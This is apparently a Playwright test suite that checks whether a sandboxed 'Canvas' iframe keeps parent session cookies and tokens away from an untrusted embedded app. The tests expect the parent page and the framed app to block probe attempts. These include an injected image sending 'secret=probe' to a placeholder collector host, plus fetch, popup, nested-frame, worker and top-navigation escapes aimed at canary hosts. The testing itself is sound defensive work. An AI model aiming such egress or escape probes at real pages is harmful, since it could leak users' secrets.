import {
  APIRequestContext,
  BrowserContext,
  Frame,
  Page,
  Route,
  expect,
  test,
} from '@playwright/test';

const BASE_URL = 'http://127.0.0.1:4173';
const THREAD_ID = '11111111-1111-4111-8111-111111111111';
const WRAPPER_PATH = `/sessions/${THREAD_ID}/canvas`;
const VIEWER_SUFFIX = '.canvas.invalid';
const CHALLENGE = 'c'.repeat(43);
const READY_RECEIPT = 'r'.repeat(43);
const EXCHANGE_CODE = 'e'.repeat(43);
const BRIDGE_NONCE = 'b'.repeat(43);
const BOOTSTRAP_BINDING = 'n'.repeat(43);
const VIEWER_SESSION = 's'.repeat(43);
const PARENT_SESSION = 'parent-session-secret-not-for-viewer';
const KEYCLOAK_SESSION = 'identity-provider-secret-not-for-viewer';
const LIVE_FRAME = 'app-canvas-live-app-renderer iframe';
const PARENT_CSP = "frame-ancestors 'none'; img-src 'self' blob: data:";

interface SafeRequest {
  method: string;
  path: string;
  headerNames: string[];
  cookieNames: string[];
  hasAuthorization: boolean;
  hasCsrf: boolean;
  ifMatch: string | null;
  origin: string | null;
  secFetchDest: string | null;
  secFetchMode: string | null;
  secFetchSite: string | null;
}

interface FixtureState {
  authenticated: boolean;
  revoked: boolean;
  presentationRevision: number;
  originGeneration: number;
  requests: SafeRequest[];
  attachments: Array<{
    attachmentId: string;
    origin: string;
    originGeneration: number;
    ifMatch: string | null;
  }>;
  closedAttachmentIds: string[];
  serverRevokedAttachmentIds: string[];
  authorize: Array<{
    attachmentId: string;
    bodyKeys: string[];
    proofMatches: boolean;
  }>;
  resetOrigin: Array<{ifMatch: string | null; hasCsrf: boolean}>;
  logoutCount: number;
}

interface ViewerRequest {
  phase: 'bootstrap' | 'exchange' | 'application' | 'other';
  url: string;
  method: string;
  cookieNames: string[];
  headerNames: string[];
  hasAuthorization: boolean;
  secFetchDest: string | null;
  secFetchMode: string | null;
  secFetchSite: string | null;
}

interface ExchangeObservation {
  bodyKeys: string[];
  proofMatches: boolean;
  bootstrapCookiePresent: boolean;
  storageSimulated: boolean;
}

interface ViewerTrace {
  requests: ViewerRequest[];
  exchanges: ExchangeObservation[];
  canaryRequests: string[];
  trustedNavigationRequests: string[];
  applicationResponseHeaders: Record<string, string>[];
}

interface ProbeResult {
  externalFetchBlocked: boolean;
  popupBlocked: boolean;
  topNavigationBlocked: boolean;
  referrer: string;
  documentCookie: string;
}

interface ViewerGatewayOptions {
  dropBootstrapCookie?: boolean;
  simulatePartitionedStorage?: boolean;
}

test.describe('Dynamic Canvas production-browser conformance', () => {
  test.beforeEach(async ({context, request}) => {
    await resetFixture(request);
    await context.addCookies([
      {
        name: 'srw_session',
        value: PARENT_SESSION,
        url: BASE_URL,
        httpOnly: true,
        sameSite: 'Lax',
      },
      {
        name: 'KEYCLOAK_SESSION',
        value: KEYCLOAK_SESSION,
        url: BASE_URL,
        httpOnly: true,
        sameSite: 'Lax',
      },
    ]);
  });

  test('uses the production wrapper, completes the iframe exchange, and isolates credentials', async ({
    context,
    page,
    request,
  }) => {
    const trace = await installViewerGateway(context);
    const consoleMessages: string[] = [];
    page.on('console', message => consoleMessages.push(message.text()));

    const navigation = await openCanvas(page);
    expect(navigation).not.toBeNull();
    const parentHeaders = await navigation!.allHeaders();
    expect(parentHeaders['content-security-policy']).toBe(PARENT_CSP);
    expect(parentHeaders['x-frame-options']).toBe('DENY');

    const productionScripts = await page.locator('script[src]').evaluateAll(elements =>
      elements.map(element => element.getAttribute('src') || ''),
    );
    expect(productionScripts.some(source => /(?:^|\/)main-[A-Z0-9]+\.js$/i.test(source))).toBe(true);

    const iframe = page.locator(LIVE_FRAME);
    await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms');
    await expect(iframe).toHaveAttribute('referrerpolicy', 'no-referrer');
    await expect(iframe).toHaveAttribute(
      'allow',
      "camera 'none'; microphone 'none'; geolocation 'none'; clipboard-read 'none'; clipboard-write 'none'",
    );
    await expect(iframe).toHaveAttribute(
      'title',
      'Live Canvas application: Browser conformance app',
    );
    await expect(
      page.getByText('Untrusted app — do not enter passwords or secrets.'),
    ).toBeVisible();

    const src = await iframe.getAttribute('src');
    expect(src).not.toBeNull();
    const bootstrapUrl = new URL(src!);
    expect(bootstrapUrl.protocol).toBe('https:');
    expect(bootstrapUrl.hostname.endsWith(VIEWER_SUFFIX)).toBe(true);
    expect(bootstrapUrl.pathname).toBe('/_canvas/bootstrap');
    expect([...bootstrapUrl.searchParams.keys()]).toEqual(['attachment_id']);
    expect(bootstrapUrl.searchParams.get('attachment_id')).toMatch(
      /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/,
    );
    expect(src).not.toContain('bridge');
    expect(src).not.toContain('challenge');
    expect(src).not.toContain('exchange');

    const frame = await applicationFrame(page);
    await expect(page.frameLocator(LIVE_FRAME).locator('#canvas-app-ready')).toHaveText(
      'Canvas application ready',
    );
    expect(await frame.locator('#document-referrer').textContent()).toBe('');
    expect(await frame.locator('#document-cookie').textContent()).toBe('');

    await expect.poll(() => trace.exchanges.length).toBe(1);
    expect(trace.exchanges[0].bodyKeys).toEqual([
      'attachment_id',
      'challenge',
      'exchange_code',
    ]);
    expect(trace.exchanges[0].proofMatches).toBe(true);
    expect(
      trace.exchanges[0].bootstrapCookiePresent || trace.exchanges[0].storageSimulated,
    ).toBe(true);
    expect(trace.requests.some(entry => entry.phase === 'application')).toBe(true);
    for (const observed of trace.requests) {
      expect(observed.cookieNames).not.toContain('srw_session');
      expect(observed.cookieNames).not.toContain('KEYCLOAK_SESSION');
      expect(observed.hasAuthorization).toBe(false);
      expect(observed.url).not.toContain(PARENT_SESSION);
      expect(observed.url).not.toContain(KEYCLOAK_SESSION);
      expect(observed.url).not.toContain(BRIDGE_NONCE);
      expect(observed.url).not.toContain(EXCHANGE_CODE);
    }

    expect(trace.applicationResponseHeaders).toHaveLength(1);
    // Same-origin nesting is the app's own content; the canary probe above
    // proves cross-origin framing stays blocked under this exact directive.
    expect(trace.applicationResponseHeaders[0]['content-security-policy']).toContain(
      "frame-src 'self' blob:",
    );
    expect(trace.applicationResponseHeaders[0]['content-security-policy']).toContain(
      "object-src 'none'",
    );
    expect(trace.applicationResponseHeaders[0]['permissions-policy']).toContain('camera=()');
    expect(trace.applicationResponseHeaders[0]['referrer-policy']).toBe('no-referrer');
    expect(trace.applicationResponseHeaders[0]['set-cookie']).toBeUndefined();

    const fixture = await fixtureState(request);
    expect(fixture.attachments).toHaveLength(1);
    expect(fixture.authorize).toEqual([
      {
        attachmentId: fixture.attachments[0].attachmentId,
        bodyKeys: ['bridge_nonce', 'challenge', 'ready_receipt'],
        proofMatches: true,
      },
    ]);
    const create = fixture.requests.find(entry => entry.path.endsWith('/view-attachments'));
    expect(create?.cookieNames).toContain('srw_session');
    expect(create?.hasCsrf).toBe(true);
    expect(create?.hasAuthorization).toBe(false);
    expect(create?.ifMatch).toMatch(/^"canvas:1:[0-9a-f]{64}"$/);
    expect(create?.secFetchSite).toBe('same-origin');
    expect(create?.secFetchMode).toBe('cors');
    expect(create?.secFetchDest).toBe('empty');

    const combinedConsole = consoleMessages.join('\n');
    for (const secret of [PARENT_SESSION, KEYCLOAK_SESSION, BRIDGE_NONCE, EXCHANGE_CODE]) {
      expect(combinedConsole).not.toContain(secret);
    }
  });

  test('blocks arbitrary image egress from the trusted parent document', async ({
    context,
    page,
  }) => {
    await installViewerGateway(context);
    let outboundRequests = 0;
    await context.route('https://markdown-image-probe.invalid/**', async route => {
      outboundRequests++;
      await route.abort('blockedbyclient');
    });
    await openCanvas(page);

    const outcome = await page.evaluate(() => new Promise<string>(resolve => {
      const image = document.createElement('img');
      const timeout = window.setTimeout(() => resolve('timeout'), 2_000);
      image.onload = () => {
        window.clearTimeout(timeout);
        resolve('loaded');
      };
      image.onerror = () => {
        window.clearTimeout(timeout);
        resolve('blocked');
      };
      image.src = 'https://markdown-image-probe.invalid/collect?secret=probe';
      document.body.append(image);
    }));

    expect(outcome).toBe('blocked');
    expect(outboundRequests).toBe(0);
  });

  test('enforces CSP, iframe sandboxing, and trusted-parent anti-framing', async ({
    context,
    page,
  }) => {
    const trace = await installViewerGateway(context);
    await openCanvas(page);
    const frame = await applicationFrame(page);
    const originalParentUrl = page.url();

    const probes = (await frame.evaluate(async () => {
      return (window as typeof window & {runCanvasSecurityProbes: () => Promise<ProbeResult>})
        .runCanvasSecurityProbes();
    })) as ProbeResult;

    expect(probes.externalFetchBlocked).toBe(true);
    expect(probes.popupBlocked).toBe(true);
    expect(probes.referrer).toBe('');
    expect(probes.documentCookie).toBe('');
    expect(page.url()).toBe(originalParentUrl);
    expect(trace.canaryRequests).toEqual([]);
    expect(trace.requests.some(entry => entry.url.endsWith('/worker-probe.js'))).toBe(false);
    expect(trace.requests.some(entry => entry.url.endsWith('/service-worker-probe.js'))).toBe(false);

    // The fixture parent is HTTP, so navigating the HTTPS app back to it would
    // be stopped earlier as mixed content. Use a synthetic HTTPS trusted
    // document with the identical production anti-framing response instead.
    await frame.evaluate(() => window.location.assign('https://trusted-cockpit.invalid/target'));
    await expect.poll(() => trace.trustedNavigationRequests.length).toBe(1);
    await page.waitForTimeout(250);
    expect(page.url()).toBe(originalParentUrl);
    await expect(page.locator('[data-testid="trusted-target"]')).toHaveCount(0);
  });

  test('rejects a copied bootstrap locator as a top-level document', async ({context, page}) => {
    await installViewerGateway(context);
    const attachmentId = '30000000-0000-4000-8000-000000000001';
    const originId = '20000000-0000-4000-8000-000000000001';
    const response = await page.goto(
      `https://${originId}${VIEWER_SUFFIX}/_canvas/bootstrap?attachment_id=${attachmentId}`,
    );

    expect(response?.status()).toBe(403);
    await expect(page.locator('[data-testid="copied-locator-denied"]')).toHaveText(
      'Canvas bootstrap requires an embedded Cockpit navigation',
    );
  });

  test('shows the safe unsupported-browser fallback when partitioned storage is unavailable', async ({
    context,
    page,
    request,
  }) => {
    const trace = await installViewerGateway(context, {dropBootstrapCookie: true});
    await page.goto(WRAPPER_PATH, {waitUntil: 'domcontentloaded'});

    await expect(
      page.getByRole('heading', {name: 'Secure live preview is not supported'}),
    ).toBeVisible();
    await expect(
      page.getByText(
        'For safety, Canvas did not open the app as a top-level page. Use the authenticated IDE or manual-preview workflow instead.',
      ),
    ).toBeVisible();
    await expect(page.locator(LIVE_FRAME)).toHaveCount(0);
    expect(page.url()).toContain(WRAPPER_PATH);
    expect(trace.exchanges).toEqual([
      {
        bodyKeys: ['attachment_id', 'challenge', 'exchange_code'],
        proofMatches: true,
        bootstrapCookiePresent: false,
        storageSimulated: false,
      },
    ]);
    await expect.poll(async () => (await fixtureState(request)).closedAttachmentIds.length).toBe(1);
  });

  test('rotates the app onto a fresh isolated origin', async ({context, page, request}) => {
    await installViewerGateway(context);
    await openCanvas(page);
    await applicationFrame(page);
    const before = await fixtureState(request);
    const oldOrigin = before.attachments[0].origin;

    await page.getByRole('button', {name: 'Reset app origin'}).click();
    const confirmation = page.locator('.canvas-reset-notice[role="alert"]');
    await expect(confirmation).toContainText('Start with a fresh isolated app origin?');
    await confirmation.getByRole('button', {name: 'Start with a fresh app origin'}).click();

    await expect(page.locator('#canvas-reset-title')).toHaveText('App origin was reset');
    await expect.poll(async () => (await fixtureState(request)).attachments.length).toBe(2);
    await expect(page.frameLocator(LIVE_FRAME).locator('#canvas-app-ready')).toBeVisible();
    const after = await fixtureState(request);
    expect(after.attachments[1].origin).not.toBe(oldOrigin);
    expect(after.attachments[1].originGeneration).toBe(2);
    expect(after.serverRevokedAttachmentIds).toContain(before.attachments[0].attachmentId);
    expect(after.resetOrigin).toEqual([
      {
        ifMatch: expect.stringMatching(/^"canvas:1:[0-9a-f]{64}"$/),
        hasCsrf: true,
      },
    ]);
  });

  test('fails closed at hard lease expiry while renewal is stalled', async ({
    context,
    page,
    request,
  }) => {
    await resetFixture(request, 'lease-expiry');
    await installViewerGateway(context);
    await openCanvas(page);
    await applicationFrame(page);

    await expect(page.locator(LIVE_FRAME)).toHaveCount(0, {timeout: 9_000});
    await expect(
      page.getByRole('heading', {name: 'Secure live preview is unavailable'}),
    ).toBeVisible();
    // Verify every attachment issued for this scenario is closed. Additional
    // closed IDs in the fixture history do not weaken the expiry requirement.
    await expect.poll(async () => {
      const state = await fixtureState(request);
      return state.attachments.length > 0 && state.attachments.every(
        (attachment) => state.closedAttachmentIds.includes(attachment.attachmentId),
      );
    }).toBe(true);
  });

  test('unmounts and closes the viewer after authoritative Canvas revocation', async ({
    context,
    page,
    request,
  }) => {
    await installViewerGateway(context);
    await openCanvas(page);
    await applicationFrame(page);
    const before = await fixtureState(request);

    expect((await request.post('/__e2e/revoke')).ok()).toBe(true);
    await page.getByRole('button', {name: 'Refresh Canvas status'}).click();

    await expect(page.locator(LIVE_FRAME)).toHaveCount(0);
    await expect.poll(async () => {
      const current = await fixtureState(request);
      return current.closedAttachmentIds.includes(before.attachments[0].attachmentId);
    }).toBe(true);
  });

  test('redirects through the BFF and tears down the frame when parent auth expires', async ({
    context,
    page,
    request,
  }) => {
    await installViewerGateway(context);
    await openCanvas(page);
    await applicationFrame(page);

    expect((await request.post('/__e2e/expire-auth')).ok()).toBe(true);
    await page.getByRole('button', {name: 'Refresh Canvas status'}).click();

    await expect(page.locator('[data-testid="fixture-login"]')).toHaveText(
      'Authentication required',
    );
    expect(page.url()).toContain('/auth/login?');
    expect(page.url()).not.toContain(VIEWER_SESSION);
  });

  test('logs out only through the parent BFF without forwarding viewer credentials', async ({
    context,
    page,
    request,
  }) => {
    await installViewerGateway(context);
    await openCanvas(page);
    await applicationFrame(page);

    // The pop-out intentionally suppresses trusted shell navigation. Move to
    // the normal authenticated shell before exercising its real Logout
    // control; the viewer cookie remains scoped to its isolated origin.
    await page.goto('/', {waitUntil: 'domcontentloaded'});
    await page.getByRole('button', {name: /Canvas Test User/}).click();
    await expect(page.getByRole('menuitem', {name: 'Logout'})).toBeVisible();
    await page.getByRole('menuitem', {name: 'Logout'}).click();
    await expect(page.locator('[data-testid="fixture-login"]')).toBeVisible();

    const fixture = await fixtureState(request);
    expect(fixture.logoutCount).toBe(1);
    const logout = fixture.requests.find(entry => entry.path === '/auth/logout');
    expect(logout?.cookieNames).toContain('srw_session');
    expect(logout?.cookieNames).not.toContain('__Host-canvas_session');
    expect(logout?.hasCsrf).toBe(true);
    expect(logout?.hasAuthorization).toBe(false);
  });
});

async function resetFixture(request: APIRequestContext, scenario = 'normal'): Promise<void> {
  const response = await request.post('/__e2e/reset', {data: {scenario}});
  expect(response.ok()).toBe(true);
}

async function fixtureState(request: APIRequestContext): Promise<FixtureState> {
  const response = await request.get('/__e2e/state');
  expect(response.ok()).toBe(true);
  return (await response.json()) as FixtureState;
}

async function openCanvas(page: Page) {
  // WebKit can defer rendering until the document's font resources finish.
  // Start the Canvas readiness budget after navigation, including those loads.
  const response = await page.goto(WRAPPER_PATH, {waitUntil: 'load'});
  await expect(page.locator(LIVE_FRAME)).toBeVisible();
  await expect(page.frameLocator(LIVE_FRAME).locator('#canvas-app-ready')).toBeVisible();
  return response;
}

async function applicationFrame(page: Page): Promise<Frame> {
  const frame = await page.locator(LIVE_FRAME).elementHandle().then(handle => handle?.contentFrame());
  expect(frame).not.toBeNull();
  await frame!.locator('#canvas-app-ready').waitFor({state: 'visible'});
  return frame!;
}

async function installViewerGateway(
  context: BrowserContext,
  options: ViewerGatewayOptions = {},
): Promise<ViewerTrace> {
  const effectiveOptions = {
    ...options,
    // WebKit's tracking prevention does not persist Set-Cookie from a
    // Playwright-fulfilled synthetic third-party response. Simulate only the
    // positive storage plumbing so the application path remains cross-engine;
    // dropBootstrapCookie explicitly disables this for the failure-path test.
    simulatePartitionedStorage:
      options.simulatePartitionedStorage ??
      (context.browser()?.browserType().name() === 'webkit' && !options.dropBootstrapCookie),
  };
  const trace: ViewerTrace = {
    requests: [],
    exchanges: [],
    canaryRequests: [],
    trustedNavigationRequests: [],
    applicationResponseHeaders: [],
  };

  await context.route(/^https:\/\/[^/]+\.canvas-canary\.invalid\/.*/, async route => {
    trace.canaryRequests.push(route.request().url());
    await route.abort('blockedbyclient');
  });

  await context.route(/^https:\/\/trusted-cockpit\.invalid\/.*/, async route => {
    trace.trustedNavigationRequests.push(route.request().url());
    await route.fulfill({
      status: 200,
      contentType: 'text/html; charset=utf-8',
      headers: {
        'Cache-Control': 'private, no-store',
        'Content-Security-Policy': "frame-ancestors 'none'",
        'X-Frame-Options': 'DENY',
      },
      body:
        '<!doctype html><meta charset="utf-8">' +
        '<main data-testid="trusted-target">Trusted Cockpit content</main>',
    });
  });

  await context.route(
    /^https:\/\/[0-9a-f-]+\.canvas\.invalid\/.*/,
    async route => handleViewerRoute(route, trace, effectiveOptions),
  );
  return trace;
}

async function handleViewerRoute(
  route: Route,
  trace: ViewerTrace,
  options: ViewerGatewayOptions,
): Promise<void> {
  const request = route.request();
  const url = new URL(request.url());
  const headers = await request.allHeaders();
  const cookies = cookieNames(headers['cookie']);
  const phase = viewerPhase(url.pathname);
  trace.requests.push({
    phase,
    url: request.url(),
    method: request.method(),
    cookieNames: cookies,
    headerNames: Object.keys(headers).sort(),
    hasAuthorization: typeof headers['authorization'] === 'string',
    secFetchDest: headers['sec-fetch-dest'] || null,
    secFetchMode: headers['sec-fetch-mode'] || null,
    secFetchSite: headers['sec-fetch-site'] || null,
  });

  if (phase === 'bootstrap') {
    const attachmentId = url.searchParams.get('attachment_id') || '';
    // Playwright routes before Chromium/WebKit append Fetch Metadata to the
    // eventual network request. Frame ownership is the deterministic
    // in-process equivalent; deployed-gateway Fetch Metadata remains an edge
    // gate, while the same-origin parent POST is observed by the HTTP fixture.
    const correctlyEmbedded = request.frame().parentFrame() !== null;
    if (!correctlyEmbedded) {
      await route.fulfill({
        status: 403,
        contentType: 'text/html; charset=utf-8',
        headers: {'Cache-Control': 'private, no-store'},
        body:
          '<!doctype html><meta charset="utf-8">' +
          '<main data-testid="copied-locator-denied">' +
          'Canvas bootstrap requires an embedded Cockpit navigation</main>',
      });
      return;
    }
    if (
      !/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(
        attachmentId,
      ) ||
      url.search !== `?attachment_id=${attachmentId}`
    ) {
      await route.fulfill({status: 400, body: 'Invalid Canvas bootstrap locator'});
      return;
    }

    const nonce = 'canvas-bootstrap-nonce';
    const bootstrapHeaders: Record<string, string> = {
      'Cache-Control': 'private, no-store',
      'Content-Security-Policy':
        `default-src 'none'; frame-ancestors ${BASE_URL}; base-uri 'none'; ` +
        `form-action 'none'; script-src 'nonce-${nonce}'; connect-src 'self'`,
      'Permissions-Policy': deniedPermissionsPolicy(),
      'Referrer-Policy': 'no-referrer',
      'X-Content-Type-Options': 'nosniff',
    };
    if (!options.dropBootstrapCookie) {
      bootstrapHeaders['Set-Cookie'] =
        `__Host-canvas_bootstrap_${attachmentId}=${BOOTSTRAP_BINDING}; Path=/; ` +
        'Max-Age=30; Secure; HttpOnly; SameSite=None; Partitioned';
    }
    await route.fulfill({
      status: 200,
      contentType: 'text/html; charset=utf-8',
      headers: bootstrapHeaders,
      body: bootstrapDocument(attachmentId, nonce),
    });
    return;
  }

  if (phase === 'exchange') {
    const body = safePostData(request.postData());
    const attachmentId = typeof body?.['attachment_id'] === 'string' ? body['attachment_id'] : '';
    const bootstrapCookiePresent = cookies.includes(`__Host-canvas_bootstrap_${attachmentId}`);
    const storageSimulated =
      !bootstrapCookiePresent && options.simulatePartitionedStorage === true;
    const proofMatches =
      body?.['challenge'] === CHALLENGE && body?.['exchange_code'] === EXCHANGE_CODE;
    trace.exchanges.push({
      bodyKeys: body ? Object.keys(body).sort() : [],
      proofMatches,
      bootstrapCookiePresent,
      storageSimulated,
    });
    if (!proofMatches || (!bootstrapCookiePresent && !storageSimulated)) {
      await route.fulfill({
        status: 409,
        contentType: 'application/json',
        headers: {'Cache-Control': 'private, no-store'},
        body: JSON.stringify({
          detail: {
            code: 'canvas_browser_storage_unavailable',
            message: 'Canvas browser storage is unavailable for secure embedding',
          },
        }),
      });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      headers: {
        'Cache-Control': 'private, no-store',
        'Content-Security-Policy': "default-src 'none'",
        'Referrer-Policy': 'no-referrer',
        'Set-Cookie':
          `__Host-canvas_session=${VIEWER_SESSION}; Path=/; Max-Age=120; ` +
          'Secure; HttpOnly; SameSite=None; Partitioned',
        'X-Content-Type-Options': 'nosniff',
      },
      body: JSON.stringify({entry_path: '/'}),
    });
    return;
  }

  if (phase === 'application') {
    const correctlyEmbedded = request.frame().parentFrame() !== null;
    if (
      !correctlyEmbedded ||
      (!cookies.includes('__Host-canvas_session') && !options.simulatePartitionedStorage)
    ) {
      await route.fulfill({
        status: correctlyEmbedded ? 401 : 403,
        contentType: 'text/html; charset=utf-8',
        body: 'Canvas viewer session or embedding context missing',
      });
      return;
    }
    const nonce = 'canvas-application-nonce';
    const responseHeaders = {
      'cache-control': 'private, no-store',
      'content-security-policy':
        `default-src 'self'; script-src 'nonce-${nonce}'; style-src 'nonce-${nonce}'; ` +
        "img-src 'self' data:; connect-src 'self'; frame-src 'self' blob:; " +
        "object-src 'none'; " +
        `worker-src 'none'; frame-ancestors 'self' ${BASE_URL}; ` +
        "base-uri 'none'; form-action 'self'",
      'cross-origin-resource-policy': 'same-origin',
      'permissions-policy': deniedPermissionsPolicy(),
      'referrer-policy': 'no-referrer',
      'x-content-type-options': 'nosniff',
    };
    trace.applicationResponseHeaders.push(responseHeaders);
    await route.fulfill({
      status: 200,
      contentType: 'text/html; charset=utf-8',
      headers: responseHeaders,
      body: applicationDocument(nonce),
    });
    return;
  }

  await route.fulfill({status: 404, body: 'Canvas fixture route not found'});
}

function viewerPhase(pathname: string): ViewerRequest['phase'] {
  if (pathname === '/_canvas/bootstrap') return 'bootstrap';
  if (pathname === '/_canvas/exchange') return 'exchange';
  if (pathname === '/') return 'application';
  return 'other';
}

function cookieNames(cookieHeader: string | undefined): string[] {
  if (!cookieHeader) return [];
  return cookieHeader
    .split(';')
    .map(value => value.trim().split('=', 1)[0])
    .filter(Boolean)
    .sort();
}

function safePostData(postData: string | null): Record<string, unknown> | null {
  if (!postData) return null;
  try {
    const value = JSON.parse(postData) as unknown;
    return typeof value === 'object' && value !== null && !Array.isArray(value)
      ? (value as Record<string, unknown>)
      : null;
  } catch {
    return null;
  }
}

function deniedPermissionsPolicy(): string {
  return (
    'camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), ' +
    'bluetooth=(), hid=(), midi=(), display-capture=(), clipboard-read=(), ' +
    'clipboard-write=(), fullscreen=()'
  );
}

function bootstrapDocument(attachmentId: string, nonce: string): string {
  const bootstrap = JSON.stringify({
    attachmentId,
    challenge: CHALLENGE,
    parentOrigin: BASE_URL,
    readyReceipt: READY_RECEIPT,
  });
  return `<!doctype html><meta charset="utf-8"><title>Opening Canvas</title>
<script nonce="${nonce}">
const bootstrap=${bootstrap};
const channel='srw.canvas.bootstrap',version=1;
let accepted=false;
parent.postMessage({channel,version,type:'challenge',attachment_id:bootstrap.attachmentId,
  challenge:bootstrap.challenge,ready_receipt:bootstrap.readyReceipt},bootstrap.parentOrigin);
addEventListener('message',async event=>{
  const data=event.data;
  if(accepted||event.source!==parent||event.origin!==bootstrap.parentOrigin||
    !data||data.channel!==channel||data.version!==version||data.type!=='authorize'||
    data.attachment_id!==bootstrap.attachmentId||data.challenge!==bootstrap.challenge||
    typeof data.exchange_code!=='string')return;
  accepted=true;
  let failureCode='exchange_failed';
  try{
    const response=await fetch('/_canvas/exchange',{method:'POST',credentials:'same-origin',
      redirect:'error',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        attachment_id:bootstrap.attachmentId,challenge:bootstrap.challenge,
        exchange_code:data.exchange_code})});
    if(!response.ok){
      try{const rejected=await response.json();
        if(rejected&&rejected.detail&&rejected.detail.code==='canvas_browser_storage_unavailable')
          failureCode='canvas_browser_storage_unavailable';}catch{}
      throw new Error('exchange rejected');
    }
    const result=await response.json();
    parent.postMessage({channel,version,type:'ready',attachment_id:bootstrap.attachmentId,
      challenge:bootstrap.challenge,ready_receipt:bootstrap.readyReceipt},bootstrap.parentOrigin);
    location.replace(result.entry_path);
  }catch(error){
    parent.postMessage({channel,version,type:'error',attachment_id:bootstrap.attachmentId,
      challenge:bootstrap.challenge,ready_receipt:bootstrap.readyReceipt,
      code:failureCode},bootstrap.parentOrigin);
  }
});
</script>`;
}

function applicationDocument(nonce: string): string {
  return `<!doctype html><html><head><meta charset="utf-8"><title>Canvas fixture app</title>
<style nonce="${nonce}">body{font:16px system-ui;margin:1rem}output{display:block;min-height:1em}</style>
</head><body><main id="canvas-app-ready">Canvas application ready</main>
<output id="document-referrer"></output><output id="document-cookie"></output>
<script nonce="${nonce}">
document.querySelector('#document-referrer').textContent=document.referrer;
document.querySelector('#document-cookie').textContent=document.cookie;
window.runCanvasSecurityProbes=async()=>{
  let externalFetchBlocked=false;
  try{await fetch('https://network.canvas-canary.invalid/probe',{mode:'no-cors'});}
  catch{externalFetchBlocked=true;}
  const nested=document.createElement('iframe');
  nested.src='https://frame.canvas-canary.invalid/probe';document.body.append(nested);
  const object=document.createElement('object');
  object.data='https://object.canvas-canary.invalid/probe';document.body.append(object);
  try{const worker=new Worker('/worker-probe.js');worker.terminate();}catch{}
  if('serviceWorker' in navigator){try{await navigator.serviceWorker.register('/service-worker-probe.js');}catch{}}
  let popupBlocked=true;
  try{const popup=window.open('https://popup.canvas-canary.invalid/probe','_blank');
    popupBlocked=popup===null;if(popup)popup.close();}catch{popupBlocked=true;}
  let topNavigationBlocked=false;
  try{top.location.assign('https://top.canvas-canary.invalid/probe');}
  catch{topNavigationBlocked=true;}
  await new Promise(resolve=>setTimeout(resolve,250));
  return {externalFetchBlocked,popupBlocked,topNavigationBlocked,
    referrer:document.referrer,documentCookie:document.cookie};
};
</script></body></html>`;
}
